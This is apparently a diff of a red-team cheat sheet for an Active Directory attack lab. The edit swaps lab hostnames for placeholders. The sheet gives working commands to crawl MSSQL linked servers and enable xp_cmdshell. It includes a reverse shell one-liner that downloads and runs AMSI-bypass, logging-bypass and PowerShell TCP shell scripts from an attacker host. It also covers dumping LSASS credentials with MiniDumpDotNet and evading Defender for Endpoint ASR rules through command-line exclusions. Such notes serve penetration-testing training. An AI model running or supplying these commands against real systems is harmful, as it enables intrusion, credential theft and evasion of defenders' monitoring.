   - `openquery()` function can be used to run queries on a linked database
-  - `select * from openquery("dcorp-sql1",'select * from master..sysservers')`
+  - `select * from openquery("<LINKED_SQL_SERVER>",'select * from master..sysservers')`
  
 Database Links Enumeration
-- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
+- `Get-SQLServerLinkCrawl -Instance <MSSQL_INSTANCE> -Verbose`
 - Openquery queries can be chained to access links within links (nested links)
-  - `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')`
+  - `select * from openquery("<LINKED_SQL_SERVER1>",'select * from openquery("<LINKED_SQL_SERVER2>",''select * from master..sysservers'')')`
  
 Executing Commands
 - On the target server, either `xp_cmdshell` should already be enabled, or if `rpcout` is enabled (which is disabled by default), `xp_cmdshell` can be enabled using:
-  - `EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"`
-- Use the `-QuertyTarget` parameter to run Query on a specific instance
-  - `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`
+  - `EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<TARGET_SQL_SERVER>"`
+- Use the `-QueryTarget` parameter to run Query on a specific instance
+  - `Get-SQLServerLinkCrawl -Instance <MSSQL_INSTANCE> -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <TARGET_SQL_SERVER>`
 - OS commands can be executed using nested link queries from the initial SQL server
-  - `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')`
-  - Reverse shell: `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://<IP>/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://<IP>/amsibypass.txt);iex (iwr -UseBasicParsing http://<IP>/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql33`
+  - `select * from openquery("<LINKED_SQL_SERVER1>",'select * from openquery("<LINKED_SQL_SERVER2>",''select * from openquery("<LINKED_SQL_SERVER3>",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')`
+  - Reverse shell: `Get-SQLServerLinkCrawl -Instance <MSSQL_INSTANCE> -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://<ATTACKER_IP>/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://<ATTACKER_IP>/amsibypass.txt);iex (iwr -UseBasicParsing http://<ATTACKER_IP>/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget <TARGET_SQL_SERVER>`
 
 ## MDE - EDR
 
 [MiniDumpDotNet](https://github.com/WhiteOakSecurity/MiniDumpDotNet) (Note: do not run it blindly)
-- Git clone the project and build it. Check for any detections by Windows using DefenderCheck: `.\DefenderCheck.exe C:\[ath\to\minidumpdotnet.exe`
+- Git clone the project and build it. Check for any detections by Windows using DefenderCheck: `.\DefenderCheck.exe C:\path\to\minidumpdotnet.exe`
 - Dump the LSASS process with minidumpdotnet: `.\minidumpdotnet.exe <LSASS PID> <minidump file>`
 
 To find LSASS PID
@@ -2243,4 +2241,4 @@ To find LSASS PID
 
 To avoid detections based on a specific ASR rule such as the "Block process creations originating from PSExec and WMI commands" rule:
 - winrm access (winrs) instead of PSExec/WMI execution (Note: this is undetected by MDE but detected by MDI)
-- Use `GetCommandLineExclusions` which displays a list of command line exclusions (ex: `.:\\windows\\ccm\\systemtemp\\.+`), if included in the command line will result in bypassing this rule and detection. `C:\path\to\WSManWinRM.exe eu-sql.eu.eurocorp.local "cmd /c notepad.exe C:\Windows\ccm\systemtemp\"`
+- Use `GetCommandLineExclusions` which displays a list of command line exclusions (ex: `.:\\windows\\ccm\\systemtemp\\.+`), if included in the command line will result in bypassing this rule and detection. `C:\path\to\WSManWinRM.exe <TARGET_SQL_FQDN> "cmd /c notepad.exe C:\Windows\ccm\systemtemp\"`
